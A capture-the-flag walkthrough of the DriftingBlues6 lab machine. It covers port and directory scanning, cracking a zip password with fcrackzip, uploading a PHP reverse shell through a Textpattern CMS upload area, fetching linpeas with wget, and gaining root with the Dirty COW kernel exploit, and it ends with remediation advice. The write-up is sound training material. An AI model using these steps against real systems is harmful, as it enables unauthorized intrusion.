OffSec <br>
DriftingBlues6
---

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/653a0bcc-9557-4296-9a0d-5a7ec14b5611)

# Reconnaissance/Scanning:
Let’s start things off with a network scan to see which ports are open and the services running on each.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/f41a4548-0fa6-4435-88bb-b1e239832649)

Viewing the robots text file first I found:

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/5a816696-66ba-44ca-a084-ad34a93369a4)

I ran a few gobuster scans to find any other directories that might be hidden/of interest and added the .zip extension.
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/f8729282-36c5-4eac-b908-c97eabb9a0bd)

Scan of /textpattern

 ![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/020db065-daa0-49c6-a978-26c6f4cae0dc)

Scan of /textpattern/textpattern

 ![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/96ad00c8-215e-4025-9c98-3a1ec2bddd4c)

Checking the README text file, I found the version of textpattern running.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/8d4ab872-2d4c-4574-b25c-1ca9ee70a361)
 
Since I have the version of the CMS (content Management System) I’ll check for exploits.
```
$ searchsploit textpattern 4.8.3
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/ac47419e-4884-43e2-9b01-3229fc2790fa)
 
In order to run the exploits, I need user credentials, so I need to find those. <br>
Getting back to the zip file I found, when trying to unzip it I was prompted for a password. <br>
To crack that password I used the tool fcrackzip.
```
$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u spammer.zip
```
Found the password!

 ![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/0ebe5f8b-a174-4fba-99a1-46b0f5646ea9)

Upon unzipping the file, there was a text file inside named “creds.txt”
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/5a6afc6b-15a0-49ce-a946-8cb9d03c97ed)

# Initial foothold:
Awesome, now I can try to use the exploit and try to login the CMS to poke around on it. <br>
An upload area, yes! That means i’ll be trying to upload a reverse shell.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/564abf64-2e61-4026-922f-60c94545e321)
 
Navigating to Content > Files > Upload to get the script on the server. You can see my shell uploaded as shell.php

 ![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/4b0d09fd-7063-4725-a738-91b6ea11816b)

That’s where I’ll visit to call my reverse shell.

After uploading and visiting the page, I get my reverse shell!

 ![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/7fd8e6e8-101c-4e03-8e9a-e7e8bbe47e44)

After spending what I thought was too much time looking for a way to escalate my privileges  <br>
by checking cronjobs, numerous directories, and files without any luck  <br>
I uploaded linpeas on the server to help me find what I was missing.
```
# I started a python server on my machine
$ python3 -m http.server <PORT>

# then I used wget to grab the script to the target machine
$ wget hxxp://<IP>:<PORT>/path/to/file

# after successfully getting the script change permissions to execute
$ chmod 777 linpeas.sh

# execute the script
$ ./linpeas.sh
```
*NOTE: to be able to get the file successfully on the target machine make sure to be in a writable directory such as /tmp* <br>
  
It’s showing that the machine is potentially vulnerable to CVE-2016–5195 which is the “dirty cow” kernel exploit.  <br>
Info found <a href=https://dirtycow.ninja/>here.</a>
```
"A race condition was found in the way the Linux kernel's memory subsystem 
handled the copy-on-write (COW) breakage of private read-only memory mappings. 
An unprivileged local user could use this flaw to gain write access to 
otherwise read-only memory mappings and thus increase their privileges on the 
system."
```
Here’s a snippet via exploit-db[.]com from the code on how to be able to run it.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/7a2e0edb-0a72-46c2-b34b-ca70c8c282ee)
 
After downloading the script and following the directions to execute it.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/cbfdade8-6b34-40e3-b293-f19284def466)
 
The new user with root privileges is made via the script and now I can escalate to that user.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/6fb8fec0-8f81-471d-ac3d-0abd31bcc0dc)
 
Finally, I can grab the root flag!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/c5eecf02-4b7d-4e8e-ba22-6286a645554c)

# Reporting:
•	Be sure to use strong passwords on files or even a password manager to help generate and store the password. <br>
•	Keep all software and hardware patched and up to date with the latest security releases to prevent vulnerabilities. <br>
•	Data sanitization and file content checking on anything that can be posted/uploaded needs to be in place.












































